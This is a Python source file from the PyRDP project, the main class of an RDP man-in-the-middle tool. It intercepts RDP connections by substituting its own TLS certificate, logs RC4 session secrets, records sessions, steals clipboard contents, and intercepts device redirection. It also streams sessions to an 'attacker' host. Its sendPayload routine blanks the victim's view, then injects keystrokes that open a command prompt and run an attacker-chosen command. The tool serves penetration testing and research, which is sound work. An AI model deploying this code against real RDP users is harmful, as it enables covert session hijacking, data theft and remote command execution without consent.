#
# This file is part of the PyRDP project.
# Copyright (C) 2019 GoSecure Inc.
# Licensed under the GPLv3 or later.
#

import asyncio
import datetime

from twisted.internet import reactor
from twisted.internet.protocol import Protocol

from pyrdp.core import AsyncIOSequencer, AwaitableClientFactory
from pyrdp.core.ssl import ClientTLSContext, ServerTLSContext
from pyrdp.enum import MCSChannelName, ParserMode, PlayerPDUType, ScanCode, SegmentationPDUType
from pyrdp.layer import ClipboardLayer, DeviceRedirectionLayer, LayerChainItem, RawLayer, VirtualChannelLayer
from pyrdp.logging import RC4LoggingObserver
from pyrdp.logging.adapters import SessionLogger
from pyrdp.logging.observers import FastPathLogger, LayerLogger, MCSLogger, SecurityLogger, SlowPathLogger, X224Logger
from pyrdp.mcs import MCSClientChannel, MCSServerChannel
from pyrdp.mitm.AttackerMITM import AttackerMITM
from pyrdp.mitm.ClipboardMITM import ActiveClipboardStealer
from pyrdp.mitm.config import MITMConfig
from pyrdp.mitm.DeviceRedirectionMITM import DeviceRedirectionMITM
from pyrdp.mitm.FastPathMITM import FastPathMITM
from pyrdp.mitm.layerset import RDPLayerSet
from pyrdp.mitm.MCSMITM import MCSMITM
from pyrdp.mitm.MITMRecorder import MITMRecorder
from pyrdp.mitm.SecurityMITM import SecurityMITM
from pyrdp.mitm.SlowPathMITM import SlowPathMITM
from pyrdp.mitm.state import RDPMITMState
from pyrdp.mitm.TCPMITM import TCPMITM
from pyrdp.mitm.VirtualChannelMITM import VirtualChannelMITM
from pyrdp.mitm.X224MITM import X224MITM
from pyrdp.mitm.PlayerLayerSet import TwistedPlayerLayerSet
from pyrdp.recording import FileLayer, RecordingFastPathObserver, RecordingSlowPathObserver


class RDPMITM:
    """
    Main MITM class. The job of this class is to orchestrate the components for all the protocols.
    """

    def __init__(self, log: SessionLogger, config: MITMConfig):
        """
        :param log: base logger to use for the connection
        :param config: the MITM configuration
        """

        self.log = log
        """Base logger for the connection"""

        self.clientLog = log.createChild("client")
        """Base logger for the client side"""

        self.serverLog = log.createChild("server")
        """Base logger for the server side"""

        self.attackerLog = log.createChild("attacker")
        """Base logger for the attacker side"""

        self.rc4Log = log.createChild("rc4")
        """Logger for RC4 secrets"""

        self.config = config
        """The MITM configuration"""

        self.state = RDPMITMState()
        """The MITM state"""

        self.client = RDPLayerSet()
        """Layers on the client side"""

        self.server = RDPLayerSet()
        """Layers on the server side"""

        self.player = TwistedPlayerLayerSet()
        """Layers on the attacker side"""

        self.recorder = MITMRecorder([], self.state)
        """Recorder for this connection"""

        self.channelMITMs = {}
        """MITM components for virtual channels"""

        serverConnector = self.connectToServer()
        self.tcp = TCPMITM(self.client.tcp, self.server.tcp, self.player.tcp, self.getLog("tcp"), self.state, self.recorder, serverConnector)
        """TCP MITM component"""

        self.x224 = X224MITM(self.client.x224, self.server.x224, self.getLog("x224"), self.state, serverConnector, self.startTLS)
        """X224 MITM component"""

        self.mcs = MCSMITM(self.client.mcs, self.server.mcs, self.state, self.recorder, self.buildChannel, self.getLog("mcs"))
        """MCS MITM component"""

        self.security: SecurityMITM = None
        """Security MITM component"""

        self.slowPath = SlowPathMITM(self.client.slowPath, self.server.slowPath, self.state)
        """Slow-path MITM component"""

        self.fastPath: FastPathMITM = None
        """Fast-path MITM component"""

        self.attacker: AttackerMITM = None

        self.client.x224.addObserver(X224Logger(self.getClientLog("x224")))
        self.client.mcs.addObserver(MCSLogger(self.getClientLog("mcs")))
        self.client.slowPath.addObserver(SlowPathLogger(self.getClientLog("slowpath")))
        self.client.slowPath.addObserver(RecordingSlowPathObserver(self.recorder))

        self.server.x224.addObserver(X224Logger(self.getServerLog("x224")))
        self.server.mcs.addObserver(MCSLogger(self.getServerLog("mcs")))
        self.server.slowPath.addObserver(SlowPathLogger(self.getServerLog("slowpath")))
        self.server.slowPath.addObserver(RecordingSlowPathObserver(self.recorder))

        self.player.player.addObserver(LayerLogger(self.attackerLog))

        self.config.outDir.mkdir(parents=True, exist_ok=True)
        self.config.replayDir.mkdir(exist_ok=True)
        self.config.fileDir.mkdir(exist_ok=True)

        self.state.securitySettings.addObserver(RC4LoggingObserver(self.rc4Log))

        if config.recordReplays:
            date = datetime.datetime.now()
            replayFileName = "rdp_replay_{}_{}.pyrdp".format(date.strftime('%Y%m%d_%H-%M-%S'), date.microsecond // 1000)
            self.recorder.addTransport(FileLayer(self.config.replayDir / replayFileName))

    def getProtocol(self) -> Protocol:
        """
        Get the Protocol expected by Twisted.
        """
        return self.client.tcp

    def getLog(self, name: str) -> SessionLogger:
        """
        Get a sub-logger from the base logger
        :param name: name of the sub-logger
        """
        return self.log.createChild(name)

    def getClientLog(self, name: str) -> SessionLogger:
        """
        Get a sub-logger from the client logger
        :param name: name of the sub-logger
        """
        return self.clientLog.createChild(name)

    def getServerLog(self, name: str) -> SessionLogger:
        """
        Get a sub-logger from the server logger
        :param name: name of the sub-logger
        """
        return self.serverLog.createChild(name)



    async def connectToServer(self):
        """
        Coroutine that connects to the target RDP server and the attacker.
        Connection to the attacker side has a 1 second timeout to avoid hanging the connection.
        """

        serverFactory = AwaitableClientFactory(self.server.tcp)
        reactor.connectTCP(self.config.targetHost, self.config.targetPort, serverFactory)

        await serverFactory.connected.wait()

        if self.config.attackerHost is not None and self.config.attackerPort is not None:
            attackerFactory = AwaitableClientFactory(self.player.tcp)
            reactor.connectTCP(self.config.attackerHost, self.config.attackerPort, attackerFactory)

            try:
                await asyncio.wait_for(attackerFactory.connected.wait(), 1.0)
                self.recorder.addTransport(self.player.tcp)
            except asyncio.TimeoutError:
                self.log.error("Failed to connect to recording host: timeout expired")



    def startTLS(self):
        """
        Execute a startTLS on both the client and server side.
        """
        contextForClient = ServerTLSContext(self.config.privateKeyFileName, self.config.certificateFileName)
        contextForServer = ClientTLSContext()

        self.client.tcp.startTLS(contextForClient)
        self.server.tcp.startTLS(contextForServer)



    def buildChannel(self, client: MCSServerChannel, server: MCSClientChannel):
        """
        Build a MITM component for an MCS channel. The client side has an MCSServerChannel because from the point of view
        of the MITM, the client channel is on a server socket and vice-versa.
        :param client: MCS channel for the client side
        :param server: MCS channel for the server side
        """

        userID = client.userID
        channelID = client.channelID

        if userID == channelID:
            self.buildVirtualChannel(client, server)
        elif self.state.channelMap[channelID] == MCSChannelName.IO:
            self.buildIOChannel(client, server)
        elif self.state.channelMap[channelID] == MCSChannelName.CLIPBOARD:
            self.buildClipboardChannel(client, server)
        elif self.state.channelMap[channelID] == MCSChannelName.DEVICE_REDIRECTION:
            self.buildDeviceChannel(client, server)
        else:
            self.buildVirtualChannel(client, server)

    def buildIOChannel(self, client: MCSServerChannel, server: MCSClientChannel):
        """
        Build the MITM component for input and output.
        :param client: MCS channel for the client side
        :param server: MCS channel for the server side
        """

        self.client.security = self.state.createSecurityLayer(ParserMode.SERVER, False)
        self.client.fastPath = self.state.createFastPathLayer(ParserMode.SERVER)
        self.server.security = self.state.createSecurityLayer(ParserMode.CLIENT, False)
        self.server.fastPath = self.state.createFastPathLayer(ParserMode.CLIENT)

        self.client.security.addObserver(SecurityLogger(self.getClientLog("security")))
        self.client.fastPath.addObserver(FastPathLogger(self.getClientLog("fastpath")))
        self.client.fastPath.addObserver(RecordingFastPathObserver(self.recorder, PlayerPDUType.FAST_PATH_INPUT))

        self.server.security.addObserver(SecurityLogger(self.getServerLog("security")))
        self.server.fastPath.addObserver(FastPathLogger(self.getServerLog("fastpath")))
        self.server.fastPath.addObserver(RecordingFastPathObserver(self.recorder, PlayerPDUType.FAST_PATH_OUTPUT))

        self.security = SecurityMITM(self.client.security, self.server.security, self.getLog("security"), self.config, self.state, self.recorder)
        self.fastPath = FastPathMITM(self.client.fastPath, self.server.fastPath, self.state)

        if self.player.tcp.transport:
            self.attacker = AttackerMITM(self.client.fastPath, self.server.fastPath, self.player.player, self.log, self.state, self.recorder)

            if MCSChannelName.DEVICE_REDIRECTION in self.state.channelMap:
                deviceRedirectionChannel = self.state.channelMap[MCSChannelName.DEVICE_REDIRECTION]

                if deviceRedirectionChannel in self.channelMITMs:
                    deviceRedirection: DeviceRedirectionMITM = self.channelMITMs[deviceRedirectionChannel]
                    self.attacker.setDeviceRedirectionComponent(deviceRedirection)

        LayerChainItem.chain(client, self.client.security, self.client.slowPath)
        LayerChainItem.chain(server, self.server.security, self.server.slowPath)

        self.client.segmentation.attachLayer(SegmentationPDUType.FAST_PATH, self.client.fastPath)
        self.server.segmentation.attachLayer(SegmentationPDUType.FAST_PATH, self.server.fastPath)

        self.sendPayload()

    def buildClipboardChannel(self, client: MCSServerChannel, server: MCSClientChannel):
        """
        Build the MITM component for the clipboard channel.
        :param client: MCS channel for the client side
        :param server: MCS channel for the server side
        """

        clientSecurity = self.state.createSecurityLayer(ParserMode.SERVER, True)
        clientVirtualChannel = VirtualChannelLayer()
        clientLayer = ClipboardLayer()
        serverSecurity = self.state.createSecurityLayer(ParserMode.CLIENT, True)
        serverVirtualChannel = VirtualChannelLayer()
        serverLayer = ClipboardLayer()

        clientLayer.addObserver(LayerLogger(self.getClientLog(MCSChannelName.CLIPBOARD)))
        serverLayer.addObserver(LayerLogger(self.getServerLog(MCSChannelName.CLIPBOARD)))

        LayerChainItem.chain(client, clientSecurity, clientVirtualChannel, clientLayer)
        LayerChainItem.chain(server, serverSecurity, serverVirtualChannel, serverLayer)

        mitm = ActiveClipboardStealer(clientLayer, serverLayer, self.getLog(MCSChannelName.CLIPBOARD), self.recorder)
        self.channelMITMs[client.channelID] = mitm

    def buildDeviceChannel(self, client: MCSServerChannel, server: MCSClientChannel):
        """
        Build the MITM component for the device redirection channel.
        :param client: MCS channel for the client side
        :param server: MCS channel for the server side
        """

        clientSecurity = self.state.createSecurityLayer(ParserMode.SERVER, True)
        clientVirtualChannel = VirtualChannelLayer(activateShowProtocolFlag=False)
        clientLayer = DeviceRedirectionLayer()
        serverSecurity = self.state.createSecurityLayer(ParserMode.CLIENT, True)
        serverVirtualChannel = VirtualChannelLayer(activateShowProtocolFlag=False)
        serverLayer = DeviceRedirectionLayer()

        clientLayer.addObserver(LayerLogger(self.getClientLog(MCSChannelName.DEVICE_REDIRECTION)))
        serverLayer.addObserver(LayerLogger(self.getServerLog(MCSChannelName.DEVICE_REDIRECTION)))

        LayerChainItem.chain(client, clientSecurity, clientVirtualChannel, clientLayer)
        LayerChainItem.chain(server, serverSecurity, serverVirtualChannel, serverLayer)

        deviceRedirection = DeviceRedirectionMITM(clientLayer, serverLayer, self.getLog(MCSChannelName.DEVICE_REDIRECTION), self.config, self.state)
        self.channelMITMs[client.channelID] = deviceRedirection

        if self.attacker:
            self.attacker.setDeviceRedirectionComponent(deviceRedirection)

    def buildVirtualChannel(self, client: MCSServerChannel, server: MCSClientChannel):
        """
        Build a generic MITM component for any virtual channel.
        :param client: MCS channel for the client side
        :param server: MCS channel for the server side
        """

        clientSecurity = self.state.createSecurityLayer(ParserMode.SERVER, True)
        clientLayer = RawLayer()
        serverSecurity = self.state.createSecurityLayer(ParserMode.CLIENT, True)
        serverLayer = RawLayer()

        LayerChainItem.chain(client, clientSecurity, clientLayer)
        LayerChainItem.chain(server, serverSecurity, serverLayer)

        mitm = VirtualChannelMITM(clientLayer, serverLayer)
        self.channelMITMs[client.channelID] = mitm

    def sendPayload(self):
        if len(self.config.payload) == 0:
            return

        if self.config.payloadDelay is None:
            self.log.error("Payload was set but no delay is configured. Please configure a payload delay. Payload will not be sent for this connection.")
            return

        if self.config.payloadDuration is None:
            self.log.error("Payload was set but no duration is configured. Please configure a payload duration. Payload will not be sent for this connection.")
            return

        def waitForDelay() -> int:
            return self.config.payloadDelay

        def disableForwarding() -> int:
            self.state.forwardInput = False
            self.state.forwardOutput = False
            return 200

        def openRunWindow() -> int:
            self.attacker.sendKeys([ScanCode.LWIN, ScanCode.KEY_R])
            return 200

        def sendCMD() -> int:
            self.attacker.sendText("cmd")
            return 200

        def sendEnterKey() -> int:
            self.attacker.sendKeys([ScanCode.RETURN])
            return 200

        def sendPayload() -> int:
            self.attacker.sendText(self.config.payload + " & exit")
            return 200

        def waitForPayload() -> int:
            return self.config.payloadDuration

        def enableForwarding():
            self.state.forwardInput = True
            self.state.forwardOutput = True

        sequencer = AsyncIOSequencer([
            waitForDelay,
            disableForwarding,
            openRunWindow,
            sendCMD,
            sendEnterKey,
            sendPayload,
            sendEnterKey,
            waitForPayload,
            enableForwarding
        ])
        sequencer.run()